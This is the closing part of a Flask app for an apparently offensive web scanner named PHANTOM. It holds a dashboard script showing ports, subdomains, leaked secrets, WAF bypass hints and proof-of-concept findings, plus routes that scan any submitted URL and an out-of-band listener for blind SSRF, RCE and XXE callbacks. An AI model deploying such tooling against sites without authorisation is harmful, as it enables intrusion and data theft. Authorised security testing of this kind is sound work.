let sid=null,poll=null,li=0,et=null,es=0,ld=null;
const SC={CRITICAL:'#f85149',HIGH:'#d29922',MEDIUM:'#58a6ff',LOW:'#3fb950'};
const SBG={CRITICAL:'#f8514920',HIGH:'#d2992218',MEDIUM:'#388bfd15',LOW:'#3fb95018'};
const SK={CRITICAL:'sC',HIGH:'sH',MEDIUM:'sM',LOW:'sL'};
const RK={CRITICAL:'rC',HIGH:'rH',MEDIUM:'rM',LOW:'rL'};
const PH=['Phase 0: OSINT & Recon','Phase 1: Port Scan','Phase 2: Spider & JS','Phase 3: Vulns & Exploits'];
function su(u){document.getElementById('iu').value=u;return false}
function showErr(msg){
  const b=document.getElementById('sb');
  b.disabled=false;b.textContent='⚡ LAUNCH PHANTOM v5.0';
  document.getElementById('fa').style.display='block';
  document.getElementById('pa').style.display='none';
  const eb=document.getElementById('err-box');
  eb.style.display='block';eb.textContent='Error: '+msg;
  if(et){clearInterval(et);et=null;}
}
async function go(){
  const url=document.getElementById('iu').value.trim();
  if(!url){alert('Enter a target URL');return}
  document.getElementById('err-box').style.display='none';
  document.getElementById('sb').disabled=true;
  document.getElementById('sb').textContent='Connecting...';
  document.getElementById('fa').style.display='none';
  document.getElementById('pa').style.display='block';
  document.getElementById('tm').innerHTML='';li=0;es=0;
  const phg=document.getElementById('phg');phg.innerHTML='';
  PH.forEach(function(p){
    const dv=document.createElement('div');dv.className='ph';
    dv.innerHTML='<div class="ph-n">'+p+'</div><div class="ph-t"><div class="ph-b" id="phb_'+p.replace(/[^A-Za-z0-9]/g,'')+'"></div></div>';
    phg.appendChild(dv);
  });
  et=setInterval(function(){es++;document.getElementById('pm').textContent=es+'s elapsed...';},1000);
  try{
    const fd=new FormData();fd.append('url',url);
    document.getElementById('sb').textContent='SCANNING...';
    const resp=await fetch('/scan',{method:'POST',body:fd});
    if(!resp.ok){showErr('Server returned '+resp.status+'. Check Render logs.');return;}
    const data=await resp.json();
    if(!data.scan_id){showErr('No scan_id returned. Server error.');return;}
    sid=data.scan_id;
    document.getElementById('rs2').textContent=url;
    poll=setInterval(tick,1800);tick();
  }catch(err){
    showErr(err.message+' — Is the server running? Check Render dashboard.');
  }
}
async function tick(){
  if(!sid)return;
  try{
    const r=await fetch('/api/status/'+sid);const d=await r.json();ld=d;
    upLog(d.logs||[]);
    document.getElementById('pb').style.width=(d.progress||0)+'%';
    document.getElementById('pp').textContent=(d.progress||0)+'%';
    document.getElementById('pl').textContent=d.current_phase||'Running...';
    const pp=d.phase_prog||{};
    PH.forEach(p=>{const b=document.getElementById('phb_'+p.replace(/[^A-Za-z0-9]/g,''));
      if(b){const info=pp[p]||{done:0,total:1};b.style.width=Math.round((info.done/Math.max(info.total,1))*100)+'%';}});
    document.getElementById('info-grid').style.display='grid';
    // WAF
    const waf=d.waf_info||{};
    if(waf.waf){document.getElementById('waf-card').style.display='block';
      document.getElementById('waf-row').innerHTML=
        '<span class="wi">Detected:<span class="wv" style="color:var(--yr)">'+waf.waf+'</span></span>'+
        '<span class="wi">Confidence:<span class="wv">'+waf.confidence+'%</span></span>'+
        '<span class="wi" style="display:block;margin-top:4px">Bypass: <span class="wv" style="color:var(--mg)">'+esc(waf.bypass_hint||'')+'</span></span>';}
    // Tech
    const tech=d.tech_stack||[];
    if(tech.length){document.getElementById('tech-card').style.display='block';
      document.getElementById('tech-tags').innerHTML=tech.map(t=>'<span class="tech-tag">'+t+'</span>').join('');}
    // Ports
    const ports=d.ports||[];
    if(ports.length){document.getElementById('port-card').style.display='block';
      const pg=document.getElementById('pg');pg.innerHTML='';
      ports.forEach(p=>{const isDgr=[6379,9200,27017,11211,23,8888].includes(p.port);
        const c=document.createElement('div');c.className='pch'+(isDgr?' d':'');
        c.innerHTML='<div class="pn">'+p.port+' <span class="ps">'+p.service+'</span></div>'+
          (p.version?'<div class="ps">'+esc(p.version.substring(0,30))+'</div>':'')+
          (isDgr?'<div class="ps" style="color:var(--red)">⚠ Dangerous</div>':'');pg.appendChild(c);});}
    // Subdomains
    const subs=d.subdomains||[];
    if(subs.length){document.getElementById('sub-card').style.display='block';
      const sl=document.getElementById('sub-list');sl.innerHTML='';
      subs.slice(0,15).forEach(s=>{const div=document.createElement('div');div.className='sub-item';
        div.textContent=s.subdomain+' ('+s.source+')';sl.appendChild(div);});}
    // Chain events
    const chains=d.chains||[];
    if(chains.length){document.getElementById('chain-card').style.display='block';
      const cl=document.getElementById('chain-list');cl.innerHTML='';
      chains.slice(-10).forEach(c=>{const div=document.createElement('div');div.className='chi';
        div.innerHTML='<span class="cts">['+c.ts+']</span><span class="cmg">'+esc(c.msg)+'</span>';cl.appendChild(div);});}
    if(d.status==='done'){clearInterval(poll);clearInterval(et);upLog(d.logs||[]);showRes(d);}
  }catch(e){
    console.error('tick error:',e);
    document.getElementById('pl').textContent='Connection error — retrying...';
  }
}
function upLog(logs){
  const t=document.getElementById('tm');
  logs.slice(li).forEach(l=>{const d=document.createElement('div');d.className='ll';
    d.innerHTML='<span class="lt">['+l.ts+']</span><span class="'+l.level+'">'+esc(l.msg)+'</span>';
    t.appendChild(d);li++;});t.scrollTop=t.scrollHeight;
}
function showRes(d){
  const vs=d.vulns||[];const cnt=vs.length;
  const counts={CRITICAL:0,HIGH:0,MEDIUM:0,LOW:0};
  vs.forEach(v=>counts[v.severity]=(counts[v.severity]||0)+1);
  ['CRITICAL','HIGH','MEDIUM','LOW'].forEach(s=>document.getElementById('s'+s[0]).textContent=counts[s]);
  document.getElementById('sv').style.display='grid';
  let risk='LOW';
  if(counts.CRITICAL>0)risk='CRITICAL';else if(counts.HIGH>0)risk='HIGH';else if(counts.MEDIUM>0)risk='MEDIUM';
  document.getElementById('ra').style.display='block';
  document.getElementById('rc').textContent=cnt===0?'✓ No Vulnerabilities Found':`${cnt} Vulnerabilit${cnt===1?'y':'ies'} Found`;
  document.getElementById('rs3').textContent=
    `${d.elapsed}s | ${d.urls_count||0} URLs | ${d.ports_count||0} ports | ${(d.subdomains||[]).length} subdomains | ${(d.secrets||[]).length} secrets`;
  const rb=document.getElementById('rb');rb.textContent=risk;rb.className='rb '+RK[risk];
  // CSP analysis
  const csp=d.csp_analysis||{};
  if(csp.issues&&csp.issues.length){
    document.getElementById('csp-card').style.display='block';
    const ci=document.getElementById('csp-issues');ci.innerHTML='';
    csp.issues.forEach(i=>{const div=document.createElement('div');div.className='csp-issue';div.textContent='⚠ '+i;ci.appendChild(div);});}
  // Vulns
  const ord={CRITICAL:0,HIGH:1,MEDIUM:2,LOW:3};
  vs.sort((a,b)=>(ord[a.severity]||4)-(ord[b.severity]||4));
  const vl=document.getElementById('vl');vl.innerHTML='';
  if(cnt===0){vl.innerHTML='<div class="nv">✅ No vulnerabilities detected — site appears secure for these tests.</div>';}
  else{
    vs.forEach((v,i)=>{
      const s=v.severity||'MEDIUM';const fi='fd'+i;
      const c=document.createElement('div');c.className='vc '+SK[s];
      let h='<div class="vh"><span class="vs" style="background:'+SBG[s]+';color:'+SC[s]+'">'+s+'</span>'+
            '<span class="vt">'+esc(v.type)+'</span><span class="vcvs">CVSS '+v.cvss+'</span></div>'+
            '<div class="vcvec">'+esc(v.cvss_vector||'')+'</div>'+
            '<div class="vd">'+esc(v.location);
      if(v.parameter)h+=' · param: <strong>'+esc(v.parameter)+'</strong>';
      h+='</div>';
      if(v.payload)h+='<div class="vpay">▸ '+esc(v.payload)+'</div>';
      if(v.evidence)h+='<div class="vd">'+esc(v.evidence)+'</div>';
      if(v.code)h+='<div class="vcode"><span class="vcl">⟨/⟩ WHERE IN CODE</span><pre>'+esc(v.code)+'</pre></div>';
      const ext=v.extracted||{};
      if(Object.keys(ext).length)
        h+='<div class="vext">★ EXTRACTED: '+esc(JSON.stringify(ext).substring(0,200))+'</div>';
      if(v.impact)h+='<div class="vimp">⚡ '+esc(v.impact)+'</div>';
      if(v.poc)h+='<button class="ftb" onclick="tf2('+i+')">▸ Proof-of-Concept (reproduce)</button>'+
                 '<div class="fd vpoc" id="pc'+i+'"><pre>'+esc(v.poc)+'</pre></div>';
      if(v.fix&&v.fix.length){
        h+='<button class="ftb" onclick="tf('+i+')">▸ Remediation Steps</button>'+
           '<div class="fd" id="fd'+i+'"><ol>';
        v.fix.forEach(function(step){h+='<li>'+esc(step)+'</li>';});
        h+='</ol></div>';}
      c.innerHTML=h;vl.appendChild(c);
    });
  }
  document.getElementById('dl').onclick=()=>{
    const b=new Blob([JSON.stringify(d,null,2)],{type:'application/json'});
    const a=document.createElement('a');a.href=URL.createObjectURL(b);
    a.download='phantom_v4_'+sid+'.json';a.click();return false;};
}
function tf(n){var e=document.getElementById('fd'+n);e.style.display=e.style.display==='block'?'none':'block';}
function tf2(n){var e=document.getElementById('pc'+n);e.style.display=e.style.display==='block'?'none':'block';}
function esc(s){return String(s||'').replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');}
</script>
</body>
</html>"""

# ══ FLASK ROUTES ══════════════════════════════════════════════════════════════
@app.route("/")
def home():
    return HOME_HTML

@app.route("/scan", methods=["POST"])
def start_scan():
    url = request.form.get("url","").strip()
    if not url: return jsonify({"error":"URL required"}),400
    if not url.startswith(("http://","https://")): url = "https://"+url
    job = ScanJob(url)
    scans[job.id] = job
    threading.Thread(target=run_scan, args=(job,), daemon=True).start()
    return jsonify({"scan_id": job.id})

@app.route("/api/status/<sid>")
def status(sid):
    job = scans.get(sid)
    if not job: return jsonify({"error":"Not found"}),404
    with job._lock:
        logs   = list(job.logs)
        vulns  = list(job.vulns)
        ports  = list(job.ports)
        chains = list(job.chains)
        pp     = {k: dict(v) for k,v in job.phase_prog.items()}
        subs   = list(job.subdomains)
        secrets= list(job.secrets)
    return jsonify({
        "status":       job.status,
        "logs":         logs,
        "vulns":        vulns,
        "ports":        ports,
        "chains":       chains,
        "progress":     job.progress,
        "current_phase":job.current_phase,
        "phase_prog":   pp,
        "waf_info":     job.waf_info,
        "tech_stack":   job.tech_stack,
        "subdomains":   subs,
        "csp_analysis": job.csp_analysis,
        "ssl_info":     job.ssl_info,
        "secrets":      secrets,
        "elapsed":      round(time.time()-job.start,1) if job.status=="running" else job.elapsed,
        "urls_count":   len(job.urls),
        "ports_count":  len(job.ports),
        "forms_count":  len(job.forms),
        "oob_events":   job.oob_events,
        "api_info":     job.api_info,
        "rl_strategies":job.mutator.ranking(),
    })

@app.route("/oob/<token>", defaults={"rest": ""})
@app.route("/oob/<token>/<path:rest>")
def oob_collect_endpoint(token, rest):
    """Out-of-band interaction listener — the heart of the OOB engine. Any blind
    SSRF/RCE/XXE that makes a target fetch this URL is recorded here."""
    with OOB_LOCK:
        OOB_HITS.setdefault(token, []).append({
            "ts":   datetime.now().strftime("%H:%M:%S"),
            "ip":   request.headers.get("X-Forwarded-For", request.remote_addr),
            "ua":   request.headers.get("User-Agent", "")[:120],
            "ctx":  rest,
            "path": request.full_path[:200],
        })
    return ("", 204)

@app.route("/health")
def health():
    active = sum(1 for s in scans.values() if s.status=="running")
    return jsonify({"status":"ok","version":VER,"active_scans":active,
                    "oob_ready":bool(OOB_BASE),"headless":PW_OK,"fast":FAST})

if __name__ == "__main__":
    print(f"[*] PHANTOM v{VER} starting on port {PORT}")
    print(f"[*] Open: http://localhost:{PORT}")
    app.run(host="0.0.0.0", port=PORT, debug=False, threaded=True)
